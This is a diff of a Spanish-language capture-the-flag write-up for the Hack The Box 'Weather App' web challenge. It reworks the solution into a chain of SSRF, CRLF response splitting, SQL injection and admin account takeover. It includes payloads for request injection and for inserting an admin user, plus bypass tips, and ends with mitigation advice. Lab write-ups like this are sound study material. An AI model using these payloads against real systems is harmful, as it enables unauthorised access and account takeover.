@@ -4,7 +4,7 @@ type: Web
 difficulty: Easy
 platform: Hack The Box
 state: Retired
-tags: [web, ssrf, internal-service, metadata]
+tags: [web, nodejs, ssrf, response-splitting, sqli, account-takeover]
 ---
 
 # Weather App — Hack The Box
@@ -15,54 +15,81 @@ tags: [web, ssrf, internal-service, metadata]
 
 ## TL;DR
 
-App que consulta el tiempo por ciudad. El backend **hace la petición HTTP por ti** y acepta URLs del usuario: **SSRF**. Apuntando a `127.0.0.1` se llega a un servicio interno que no está expuesto y que devuelve la flag.
+Se entrega el **código fuente** (Node.js + Express). El frontend hace de proxy hacia una API interna de clima (`/api/weather`) y concatena la ciudad en la URL sin sanear: **SSRF**. Combinado con **response splitting (CRLF)**, se inyecta una segunda petición HTTP contra el servicio interno, que además tiene **SQLi**. El resultado es crear un usuario administrador con contraseña conocida, entrar y leer la flag.
 
 ## Enunciado
 
-Formulario con un campo de ciudad que devuelve temperatura y condiciones. Hay un servicio interno en el mismo host.
+Aplicación con descarga de código. Un campo de ciudad devuelve el tiempo. Existe un servicio interno que no está expuesto.
 
 ## Análisis
 
 ```bash
-curl -s "http://<IP>:<puerto>/api/weather?city=Madrid"
+unzip weather-app.zip && cd app && npm install
+grep -rn "http.get\|axios\|fetch\|request(" .
 ```
 
-La respuesta es JSON del proveedor. Se prueba si el parámetro acepta una URL completa:
+Puntos clave del código:
 
-```bash
-curl -s "http://<IP>:<puerto>/api/weather?city=http://127.0.0.1:80/"
+```js
+// routes/weather.js
+const city = req.body.city;
+const url = `http://internal-api:3000/weather?city=${city}`;
+http.get(url, ...)
 ```
 
-Si el cuerpo devuelto cambia al apuntar a otro puerto, la petición la hace el servidor. Enumeración interna:
-
-```bash
-for p in 80 3000 5000 8000 8080; do
-  echo "== $p"; curl -s "http://<IP>:<puerto>/api/weather?city=http://127.0.0.1:$p/" | head -c 200; echo
-done
-```
+La ciudad se concatena tal cual: no hay `encodeURIComponent` ni allowlist. Además, la respuesta del servicio interno se copia al cliente, lo que permite **inyectar cabeceras**.
 
 ## Explotación
 
-El servicio interno responde en un puerto local con un endpoint que entrega la flag (o un panel sin autenticación):
+### 1. Confirmar el SSRF
 
 ```bash
-curl -s "http://<IP>:<puerto>/api/weather?city=http://127.0.0.1:<puerto_interno>/flag"
+curl -s "http://<IP>:<puerto>/api/weather" -H 'Content-Type: application/json' \
+  -d '{"city":"London"}'
 ```
+
+### 2. Response splitting
+
+El parámetro viaja en la URL de la petición interna. Con `%0d%0a` se corta la petición y se añade otra:
 
 ```text
-HTB{<flag>}
+city=London%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aGET%20/admin%20HTTP/1.1
 ```
 
-Si el filtro bloquea `127.0.0.1`, las alternativas habituales son `localhost`, `0.0.0.0`, `[::1]` o un dominio que resuelva a loopback.
+Eso permite hablar con endpoints del servicio interno que el proxy no expone.
+
+### 3. SQLi en el servicio interno
+
+El parámetro `city` del servicio interno acaba en una consulta:
+
+```text
+London' UNION SELECT ... -- -
+```
+
+Con la inyección se crea (o se modifica) un usuario con rol `admin` y contraseña conocida:
+
+```sql
+'; INSERT INTO users (username, password, role) VALUES ('admin','<hash_conocido>','admin'); -- -
+```
+
+### 4. Account takeover
+
+```bash
+curl -s -X POST "http://<IP>:<puerto>/login" \
+  -d 'username=admin&password=<password>'
+```
+
+La sesión de administrador devuelve la flag en el panel.
 
 ## Tropiezos
 
-- **Filtro de esquema**: probar `file://` y `gopher://` para leer ficheros o hablar con Redis.
-- **Redirecciones**: un 302 hacia el destino interno también sirve si el cliente sigue redirecciones.
-- **Puerto equivocado**: enumerar antes de asumir el 80.
+- **Codificación en dos capas**: la ciudad va en JSON y luego en una URL; hay que codificar `%0d%0a` sin que el framework lo normalice.
+- **Host interno**: el nombre del servicio sale del código (`internal-api`), no hace falta adivinarlo.
+- **Node actualizado**: la versión vieja de Node es la que permite el *request smuggling* por CRLF; en versiones nuevas el vector desaparece.
+- **Comillas en SQLi**: si el filtro bloquea `'`, probar variantes numéricas o `/**/`.
 
 ## Lecciones
 
-- Una URL controlada por el usuario en el servidor es SSRF, aunque el parámetro se llame «ciudad».
-- Loopback y metadatos son el primer destino: los servicios internos no tienen autenticación porque «nadie los ve».
-- Mitigación: allowlist de dominios, resolver DNS y bloquear rangos privados, y no seguir redirecciones.
+- Concatenar entrada en una URL es SSRF; concatenarla en una petición HTTP en crudo es *response splitting*.
+- Un servicio interno «de confianza» suele tener SQLi porque nunca se expuso a internet.
+- Mitigación: `encodeURIComponent`, allowlist de hosts, cliente HTTP que no acepte CRLF y consultas parametrizadas.
